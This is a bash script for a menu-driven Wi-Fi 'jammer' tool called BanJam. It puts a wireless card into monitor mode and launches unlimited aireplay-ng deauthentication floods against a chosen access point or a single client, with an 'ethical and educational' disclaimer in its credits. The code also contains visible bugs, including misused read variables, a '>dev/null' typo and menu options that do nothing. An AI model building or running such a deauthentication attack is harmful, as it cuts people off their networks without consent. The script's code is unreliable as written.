#!/bin/bash

echo -e "                                                                    __          "
echo -e "  ____                              _                              /\/\         "
echo -e " | __ |  __ _ _ ___                | | __ _ _ ____ ___      /  /   |/\|   \  \  "
echo -e " |  _ \ / _' | '__  \  ____    _   | |/ _' | '__  '__  \   |  |    |\/|    |  |'"
echo -e " | |_) | (_| | |  | | |____|  | |__| | (_| | |  | |  | |    \  \  /\/\/\  /  /  "
echo -e " |____/ \__,_|_|  |_|          \_____/\__,_|_|  |_|  |_|         /_/  \_\       "

sleep 1

echo
echo Loading BanJam... Please Select from the Menu Below.
echo

sleep 1

# Selecting an interface (setup monitering mode airmon-ng)
 
    echo
    echo "[ Wireless Interfaces Found ]"
    echo
    iwconfig
    echo
    echo "Selecte Your Interface:"
    read -p "Set>" $Iface
    echo
    echo "Setting Wifi Interface to Monitering Mode..."
    sudo airmon-ng check kill $Iface
    sleep 1
    sudo airmon-ng start $Iface

#Subproccess Import and Checker

subprocess_check() {
echo "Importing Subprocesses..."
echo
if command -v aireplay-ng && airmon-ng && airodump-ng >/dev/null 2>&1; then
    echo "Subproccesses are Intalled, Checking Usability..."
    echo
    if command -v aireplay-ng && airmon-ng && airodump-ng --help >dev/null 2>&1; then
	echo "Subproccess successuly working"
        echo
    else
	echo "Subproccess Imported But Not Executed Properly"
        echo
    fi
else 
    echo "Subproccess not installed properly"
    echo
fi
sleep 2
}


# Menu Selects

wifisub_menu() {

while true; do
    echo
    echo
    echo "[--- Wifi Jammer Type Menu ---]"
    echo "1) Deauth Jammer Attack (Broadcast)"
    echo "2) Targeted Deauth Jammer Attack"
    echo "3) DDOS Bandwidth Jammer Attack"
    echo "99) Exit To Main Menu"
    read -p "Set>" wifichoice

case $wifichoice in
        1) echo ">> Preparing Wifi Attack Config..."
        sleep 1
        echo
        echo "What is Your Target BSSID: "
        sleep 1
        read -p "Set>" $BSSID0
        echo
        echo "Launching Attack"
        echo
        sleep 1
        aireplay-ng --deauth 0 -b $BSSID0 $Iface;;
        2) echo "Preparing Targeted Deauth Jammer Attack Config..."
        echo
        sleep 1
        echo "What is Your Tareted BSSID: "
        read -p "Set>" $BSSID1 $Iface
        echo
        sleep 1
        echo "What is Your Targeted MAC Address: "
        read -p "Set>" $MAC
        echo
        echo "Launching Attack"
        echo
        sleep 1
        aireplay-ng --deauth 0 -b $BSSID1 -c $MAC $Iface;;
        99) break;;
        *) echo ">> Invalid Selection";;
    esac
    read -n 1 -s -r -p $'\nPress Any Key to Return to Main Menu'
done
}

#MAIN PROCESS


while true; do
    echo
    echo
    echo "[--- Jammer Type Selection Menu ---]"
    echo "1) Wifi Jammer Attack"
    echo "2) Bluetooth Low Energy (BLE)"
    echo "3) Update BanJam"
    echo "4) Credits and About"
    echo "99) Exit BanJam"
    echo ""
    read -p "set> " choice

    case "$choice" in
        1) echo ">> Launching Wifi Jammer Attack Cofig..."
	sleep 1
	clear
	wifisub_menu;;
        2) echo ">> Launching BLE Jammer Attack...";;
        3) echo ">> Checking Subprocesseses for BanJam..."
        sleep 2
        subprocess_check
	sleep 3;;
        4) echo ">> Loading Credits..."
        echo
        echo "Concept & Development Designed, scripted, and endlessly refined by [IdontByte :0 ]"
        echo
        echo "Made with a deep passion for  Cybersecurity, Wifi Penntesting, Ethical Hacking, Coding (Its more like a love hate relationship) and just a touch of creativity."
        echo
echo "Toolchain Integration"
echo "- Aireplay-ng"
echo "- Airmon-ng & Airodump-ng"
echo "- Shell scripting (Bash)"
echo "- Linux CLI utilities"
echo "- My Last Strand of Willingness :0"
echo
echo "BanJam’s menu aesthetics, ASCII layout, and terminal presence are inspired by retro hacking culture and the design spirit of tools like SEToolKit and also Airgeddon"
echo
echo "DISCLAIMER: This tools is used for ETHICAL and EDUCATIONAL purposes only. I hope you enjoy the tool that I made :) "
echo;;
        99) echo ">> Exiting, Thank You for Using BanJam..."
        sleep 1
        sudo airmon-ng stop $Iface
        sudo systemctl start NetworkManager; break;;
        *) echo ">> Invalid selection. Try again.";;
    esac
    read -n 1 -s -r -p $'\nPress any key to return to menu...'
done


